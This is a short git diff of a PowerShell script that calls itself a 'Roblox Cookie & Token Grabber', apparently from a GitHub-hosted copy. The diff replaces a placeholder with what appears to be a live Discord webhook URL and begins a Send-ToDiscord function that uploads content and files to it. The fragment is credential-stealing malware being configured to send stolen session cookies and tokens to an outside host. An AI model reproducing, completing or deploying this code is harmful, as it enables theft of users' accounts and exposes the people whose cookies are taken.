@@ -1,7 +1,7 @@
 # Roblox Cookie & Token Grabber
 # GitHub hosted version
 
-$webhook = "YOUR_DISCORD_WEBHOOK_HERE";
+$webhook = "https://discord.com/api/webhooks/1539666619234517023/_fL4xIsHzYMW-qw-rViqCqysG3Bd25yWeNr9NqUFF9YXbB5Uk6pEg0pmfPE-HwBDCnce";
 
 function Send-ToDiscord {
     param($content, $files = $null)
